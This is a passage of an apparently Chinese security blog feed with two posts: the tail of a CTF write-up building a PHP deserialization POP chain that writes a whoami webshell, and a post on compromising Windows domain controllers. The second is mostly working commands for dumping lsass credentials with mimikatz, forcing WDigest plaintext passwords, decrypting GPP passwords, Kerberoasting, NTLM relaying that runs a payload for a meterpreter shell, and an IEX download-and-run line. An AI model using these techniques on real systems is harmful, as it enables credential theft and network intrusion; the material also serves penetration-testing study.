class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lyrics</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">shortForm</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"&lt;p>&lt;a href='song.php?name="</span> <span class="token punctuation">.</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span>song<span class="token operator">-</span><span class="token operator">></span><span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"'>"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/a>&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">name_is</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>继续找，当实例化对象Lyricsde时，log方法存在$this-&gt;logwriter-&gt;writeLog，而writeLog又存在于LogWriter_File类中，这好这个类是我们的漏洞触发点，所以$this-&gt;logwriter应该为new LogWriter_Fil()，构造下payload：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Logger</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$logwriter</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logwriter</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LogWriter_File</span><span class="token punctuation">(</span><span class="token string">'123.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logwriter</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">writeLog</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>实例化对象Logger之后，调用了LogWriter_File的writeLog方法，而写入文件的txt是通过$this-&gt;format-&gt;format获得，而format方法存在类LogFileFormat中，所以，构造如下payload：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">LogWriter_File</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$format</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span> <span class="token string">"__"</span><span class="token punctuation">,</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">format</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LogFileFormat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">writeLog</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 111</span>        <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">format</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//TODO: Modify the address here, and delete this TODO.</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"D:\\phpStudy\\WWW\\ctf"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>在类LogFileFormat中的format方法中利用$filter-&gt;filter来获取的$txt，而$filter是通过foreach获取的，所以$this-&gt;filters为一个数组，最终OutputFilter传入写入文件的内容，就可以构造如下payload：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">OutputFilter</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$matchPattern</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$replacement</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">matchPattern</span> <span class="token operator">=</span> '<span class="token comment" spellcheck="true">//';</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">replacement</span> <span class="token operator">=</span> <span class="token string">'&lt;?= `whoami`?>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">matchPattern</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">replacement</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">LogFileFormat</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$filters</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$endl</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filters</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">OutputFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">endl</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">format</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 111</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filters</span> <span class="token keyword">as</span> <span class="token variable">$filter</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token variable">$filter</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$txt</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">endl</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$txt</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>最后，将payload组合起来，利用serialize输出下序列化的结果</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/4.png" alt="4" loading="lazy"></p><pre><code>O%3A6%3A%22Lyrics%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00lyrics%22%3Bs%3A3%3A%22111%22%3Bs%3A7%3A%22%00%2A%00song%22%3BO%3A6%3A%22Logger%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00logwriter%22%3BO%3A14%3A%22LogWriter_File%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A7%3A%22123.php%22%3Bs%3A9%3A%22%00%2A%00format%22%3BO%3A13%3A%22LogFileFormat%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A12%3A%22OutputFilter%22%3A2%3A%7Bs%3A15%3A%22%00%2A%00matchPattern%22%3Bs%3A2%3A%22%2F%2F%22%3Bs%3A14%3A%22%00%2A%00replacement%22%3Bs%3A14%3A%22%3C%3F%3D+%60whoami%60%3F%3E%22%3B%7D%7Ds%3A7%3A%22%00%2A%00endl%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D%7D</code></pre><p>在base64下通过cookie传入就可以写入ctf123.php了</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/5.png" alt="5" loading="lazy"></p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p>1.<a href="http://redteam.today/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">http://redteam.today/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/</a></p><p>2.<a href="https://xz.aliyun.com/t/3674#toc-9" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674#toc-9</a></p><p>3.<a href="https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%BE%8B%E9%A2%98%E4%B8%80" target="_blank" rel="noopener">https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%BE%8B%E9%A2%98%E4%B8%80</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;序列化与反序列化&quot;&gt;&lt;a href=&quot;#序列化与反序列化&quot; class=&quot;headerlink&quot; title=&quot;序列化与反序列化&quot;&gt;&lt;/a&gt;&lt;strong&gt;序列化与反序列化&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;在php中，使用serialize和unserialize
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>获取域控的方法</title>
    <link href="http://yoursite.com/2020/02/26/%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>http://yoursite.com/2020/02/26/%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%96%B9%E6%B3%95/</id>
    <published>2020-02-26T10:35:58.000Z</published>
    <updated>2020-02-26T10:48:00.083Z</updated>
    
    <content type="html"><![CDATA[<h4 id="高权限读取本地密码"><a href="#高权限读取本地密码" class="headerlink" title="高权限读取本地密码"></a><strong>高权限读取本地密码</strong></h4><p>当域管理员在域成员机器上登录进行工作的时候，会将明文密码保存在本地进行的lsass.exe，可以通过mimikatz来读取到本地的明文密码。</p><pre><code>privilege::debug  # 提权sekurlsa::logonpasswords</code></pre><p>如果主机存在杀软的时候，上传mimikatz很多时候都会被杀掉，可以通过<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump" target="_blank" rel="noopener">procdump</a>+mimikatz的方式进行绕过。先导出lsass.exe</p><pre><code>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</code></pre><p>保存到本地，通过mimikatz读lsass.dmp的明文</p><pre><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot;  &gt; 1.txt</code></pre><p>如果目标机器是windows server 2012，通过添加注册表，在通过锁屏，让管理员重新登录及可以读取明文。</p><p>添加注册表，设置UseLogonCredential设置为1</p><pre><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></pre><p>利用powershell脚本进行锁屏</p><pre><code>Function Lock-WorkStation {$signature = @&quot;[DllImport(&quot;user32.dll&quot;, SetLastError = true)]public static extern bool LockWorkStation();&quot;@$LockWorkStation = Add-Type -memberDefinition $signature -name &quot;Win32LockWorkStation&quot; -namespace Win32Functions -passthru$LockWorkStation::LockWorkStation() | Out-Null}Lock-WorkStation</code></pre><p>管理员重新登录后就可以抓取到明文密码了。</p><h4 id="SYSVOL还原组策略"><a href="#SYSVOL还原组策略" class="headerlink" title="SYSVOL还原组策略"></a><strong>SYSVOL还原组策略</strong></h4><p>在域环境中，有个默认的共享路径</p><pre><code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</code></pre><p>SYSVOL是活动目录存储文件服务副本的共享文件夹，里面包含有登录脚本，组策略数据等，域里的所有用户都能访问这个共享文件。在SYSVOL目录下，默认是没有groups.xml文件的，必须创建组策略脚本登录才有这个文件。在groups.xml文件中，密码是通过AES-256加密的，但是微软发布了AES的<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN" target="_blank" rel="noopener">私钥</a>。</p><p>可以利用powershell解密密文:</p><pre class=" language-powershell"><code class="language-powershell"><span class="token keyword">function</span> Get<span class="token operator">-</span>DecryptedCpassword <span class="token punctuation">{</span>    <span class="token namespace">[CmdletBinding()]</span>    <span class="token keyword">Param</span> <span class="token punctuation">(</span>        <span class="token namespace">[string]</span> <span class="token variable">$Cpassword</span>    <span class="token punctuation">)</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">#Append appropriate padding based on string length  </span>        <span class="token variable">$Mod</span> = <span class="token punctuation">(</span><span class="token variable">$Cpassword</span><span class="token punctuation">.</span>length <span class="token operator">%</span> 4<span class="token punctuation">)</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$Mod</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token string">'1'</span> <span class="token punctuation">{</span><span class="token variable">$Cpassword</span> = <span class="token variable">$Cpassword</span><span class="token punctuation">.</span>Substring<span class="token punctuation">(</span>0<span class="token punctuation">,</span><span class="token variable">$Cpassword</span><span class="token punctuation">.</span>Length <span class="token operator">-</span>1<span class="token punctuation">)</span><span class="token punctuation">}</span>        <span class="token string">'2'</span> <span class="token punctuation">{</span><span class="token variable">$Cpassword</span> <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token string">'='</span> <span class="token operator">*</span> <span class="token punctuation">(</span>4 <span class="token operator">-</span> <span class="token variable">$Mod</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>        <span class="token string">'3'</span> <span class="token punctuation">{</span><span class="token variable">$Cpassword</span> <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token string">'='</span> <span class="token operator">*</span> <span class="token punctuation">(</span>4 <span class="token operator">-</span> <span class="token variable">$Mod</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token variable">$Base64Decoded</span> = <span class="token namespace">[Convert]</span>::FromBase64String<span class="token punctuation">(</span><span class="token variable">$Cpassword</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#Create a new AES .NET Crypto Object</span>        <span class="token variable">$AesObject</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Security<span class="token punctuation">.</span>Cryptography<span class="token punctuation">.</span>AesCryptoServiceProvider        <span class="token namespace">[Byte[]</span><span class="token punctuation">]</span> <span class="token variable">$AesKey</span> = @<span class="token punctuation">(</span>0x4e<span class="token punctuation">,</span>0x99<span class="token punctuation">,</span>0x06<span class="token punctuation">,</span>0xe8<span class="token punctuation">,</span>0xfc<span class="token punctuation">,</span>0xb6<span class="token punctuation">,</span>0x6c<span class="token punctuation">,</span>0xc9<span class="token punctuation">,</span>0xfa<span class="token punctuation">,</span>0xf4<span class="token punctuation">,</span>0x93<span class="token punctuation">,</span>0x10<span class="token punctuation">,</span>0x62<span class="token punctuation">,</span>0x0f<span class="token punctuation">,</span>0xfe<span class="token punctuation">,</span>0xe8<span class="token punctuation">,</span>                             0xf4<span class="token punctuation">,</span>0x96<span class="token punctuation">,</span>0xe8<span class="token punctuation">,</span>0x06<span class="token punctuation">,</span>0xcc<span class="token punctuation">,</span>0x05<span class="token punctuation">,</span>0x79<span class="token punctuation">,</span>0x90<span class="token punctuation">,</span>0x20<span class="token punctuation">,</span>0x9b<span class="token punctuation">,</span>0x09<span class="token punctuation">,</span>0xa4<span class="token punctuation">,</span>0x33<span class="token punctuation">,</span>0xb6<span class="token punctuation">,</span>0x6c<span class="token punctuation">,</span>0x1b<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#Set IV to all nulls to prevent dynamic generation of IV value</span>        <span class="token variable">$AesIV</span> = <span class="token function">New-Object</span> Byte<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$AesObject</span><span class="token punctuation">.</span>IV<span class="token punctuation">.</span>Length<span class="token punctuation">)</span>         <span class="token variable">$AesObject</span><span class="token punctuation">.</span>IV = <span class="token variable">$AesIV</span>        <span class="token variable">$AesObject</span><span class="token punctuation">.</span>Key = <span class="token variable">$AesKey</span>        <span class="token variable">$DecryptorObject</span> = <span class="token variable">$AesObject</span><span class="token punctuation">.</span>CreateDecryptor<span class="token punctuation">(</span><span class="token punctuation">)</span>         <span class="token namespace">[Byte[]</span><span class="token punctuation">]</span> <span class="token variable">$OutBlock</span> = <span class="token variable">$DecryptorObject</span><span class="token punctuation">.</span>TransformFinalBlock<span class="token punctuation">(</span><span class="token variable">$Base64Decoded</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token variable">$Base64Decoded</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token namespace">[System.Text.UnicodeEncoding]</span>::Unicode<span class="token punctuation">.</span>GetString<span class="token punctuation">(</span><span class="token variable">$OutBlock</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">catch</span> <span class="token punctuation">{</span><span class="token function">Write-Error</span> <span class="token variable">$Error</span><span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span>Get<span class="token operator">-</span>DecryptedCpassword <span class="token string">"I0vK3Yj0SeoHQDxF5skcjt3BOkMZmX6IiqRVKCTo4Z4"</span></code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/1.png" alt="" loading="lazy"></p><p>针对SYSOVL的防御：</p><pre><code>1.打补丁KB29624862.删除SYSVOL目录下的groups.xml3.设置共享文件SYSVOL的权限</code></pre><h4 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a><strong>Kerberoasting</strong></h4><p>SPN为服务主体名称，是服务实列(MSSQL,HTTP等)的唯一标识，如果在林中安装服务的多个实列，每个实列都有自己的SPN，如果kerberos服务票证的加密类型为RC4_HMAC_MD5，就可以导出TGS对其进行离线破解，获取到域用户的密码了。</p><p>使用setspn查询spn(windows7和server2008默认自带)</p><p>查询域内所有的SPN和查询test域的SPN</p><pre><code>setspn.exe -q */*setspn.exe -T test.com -q */*</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/2.png" alt="" loading="lazy"></p><p>以CN开头的为代表一个账号，机器账号为Computers，域用户账号为Users</p><p>查询域内注册的spn（kerberoast）</p><pre><code>cscript GetUserSPNs.vbs</code></pre><p>PowerView</p><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p><pre><code>Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon</code></pre><p>给MSSQL服务注册SPN</p><pre><code>setspn.exe -A MSSQLSvc/WIN-M34UCFJIPNQ.test.com test.com\fanxing</code></pre><p>将kerberos的加密方式换成RC4_HMAC_MD5</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/3.png" alt="" loading="lazy"></p><p>请求指定的TGS，完成之后klist就能查看相应的票据</p><pre><code>$SPNName = &#39;MSSQLSvc/WIN-M34UCFJIPNQ.test.com&#39;Add-Type -AssemblyNAme System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/4.png" alt="" loading="lazy"></p><p>mimikatz导出票据</p><pre><code>kerberos::list /export</code></pre><p>使用<a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" target="_blank" rel="noopener">tgsrepcrack.py</a>破解</p><pre><code>python tgsrepcrack.py wordlist.txt mssql.kirbi</code></pre><p><strong>kerberoasting后门利用</strong></p><p>在获取到spn的修改权限后，可以给指定的域用户注册spn，可以获取到任意域用户的TGS进行离线破解</p><pre><code>setspn.exe -U -A VNC/WIN-M34UCFJIPNQ.test.com Administrator</code></pre><h4 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a><strong>重放攻击</strong></h4><p>在NTML认证的过程中，数据包传递的是NTML-Hash加密的16位的challenge随机数得到的Net-NTML</p><p> Hash，如果存在中间人的情况，就可以通过hash进行重放攻击，下面简述下存在中间人，NTML协议过程：</p><p><img src="https://p1.ssl.qhimg.com/t01f22f78b71df16680.png" alt="" loading="lazy"></p><pre><code>1.当客户端对服务端发起请求，客户端并不知道中间人存在，所以把请求发送给了中间人。中间人拿着这个请求发送给服务端，服务端以为是客户端发来的请求。2.进过验证后，会生成一个随机数(challenge)返回给攻击者，服务端保存的ntmlhash进行DES加密challenge(challenge1)，攻击者拿着这个challenge明文发送给客户端。3.客户端对这个challenge用自己的密码进行DES加密(response)，发送给中间人，中间人在将这个请求发送给服务端。4.服务端拿到这个response跟之前加密的challenge1进行对比，一样的话就验证成功。</code></pre><p>在进行ntml中间人攻击的时候，要避免最小的网络流量，所以使用的比较多的也是LLMNR/NetNS欺骗。</p><p>在两台windows进行进行资源请求的时候，对机器的解析顺序为：</p><pre><code>1.HOSTS文件(c:/windows/system32/driver/etc/hosts)2.本地的DNS缓存(ipconfig /displaydns)3.dns服务器4.LLMNR5.NetBios-NS</code></pre><h5 id="SMB中继"><a href="#SMB中继" class="headerlink" title="SMB中继"></a>SMB中继</h5><p>对于smb中继的利用条件：</p><pre><code>1.不能开启smb签名，而在域内，域控上面是开启了签名的，域成员机器是没有开启的。2.打了ms08-068补丁的xp/2003系统也无法利用</code></pre><p>首先利用nmap探测是否开启了签名</p><pre><code>nmap -sT -p 445 --open --script smb-security-mode,smb-os-discovery 192.168.50.241</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/5.png" alt="" loading="lazy"></p><h5 id="Responder-ntmlrelayx"><a href="#Responder-ntmlrelayx" class="headerlink" title="Responder+ntmlrelayx"></a>Responder+ntmlrelayx</h5><p>获取ntmlv2 hash，在攻击机执行</p><pre><code>python Responder.py -I eth0 -v      #假设ip为192.168.50.64</code></pre><p>在任意机器上执行</p><pre><code>dir \\192.168.50.64\c$</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/6.png" alt="" loading="lazy"></p><p>当使用ntmlrelayx进行重放攻击的时候，需要在Responder.conf设置SMB和HTTP服务为Off</p><pre><code>python Responder.py -I eth0 -v    # 启动Responder，假设ip为192.168.50.64python ntlmrelayx.py -t 192.168.50.241   # -t为受害者，进行中继攻击net use192.168.50.64\c$ &quot;fx@123.com&quot; /user:&quot;administrator&quot;   # 攻击机执行</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/7.png" alt="" loading="lazy"></p><h5 id="smbrelayx"><a href="#smbrelayx" class="headerlink" title="smbrelayx"></a>smbrelayx</h5><p>使用smbrelayx和ntmlrelayx都是利用的<a href="https://github.com/CoreSecurity/impacket.git" target="_blank" rel="noopener">impacket</a>，环境配置</p><pre><code>pip install pycrypto    # 安装加密库apt-get --reinstall install python-pyasn1 python-pyasn1-modulescd impacket/python setup.py install</code></pre><p>在攻击机进行重放攻击</p><pre><code># -h为指定受害者，-e在进行重放攻击后，在受害者机器执行exepython smbrelayx.py -h 192.168.50.241 -e /root/shell.exe </code></pre><p>在内网其他目标机器执行</p><pre><code>net use192.168.50.64\c$ &quot;fx@123.com&quot; /user:&quot;administrator&quot;</code></pre><p>在msf上成功获取到meterpreter</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/8.png" alt="" loading="lazy"></p><h5 id="Windows平台的重放攻击"><a href="#Windows平台的重放攻击" class="headerlink" title="Windows平台的重放攻击"></a>Windows平台的重放攻击</h5><p>在windows下，可以利用powershell编写的<a href="https://github.com/Kevin-Robertson/Inveigh" target="_blank" rel="noopener">Inveigh</a>工具</p><pre><code>powershell &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1&#39;);Invoke-Inveigh -consoleoutput Y FileOutput Y&quot;</code></pre><p>在其他主机上执行</p><pre><code>dir \\192.168.50.242\c$   或者在开启HTTP，利用&lt;img&gt;来加载图片&lt;img src=&quot;\\192.168.50.242\1.png&quot;&gt;    在通过HTTP协议访问就行了</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/9.png" alt="" loading="lazy"></p><p>注意：在获取权限的那台机器，需要关闭windows防火墙，不是一直获取到challenge。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;高权限读取本地密码&quot;&gt;&lt;a href=&quot;#高权限读取本地密码&quot; class=&quot;headerlink&quot; title=&quot;高权限读取本地密码&quot;&gt;&lt;/a&gt;&lt;strong&gt;高权限读取本地密码&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;当域管理员在域成员机器上登录进行工作的时候，会将明
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP3.2.3 漏洞分析</title>
    <link href="http://yoursite.com/2020/02/24/ThinkPHP3.2.3%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
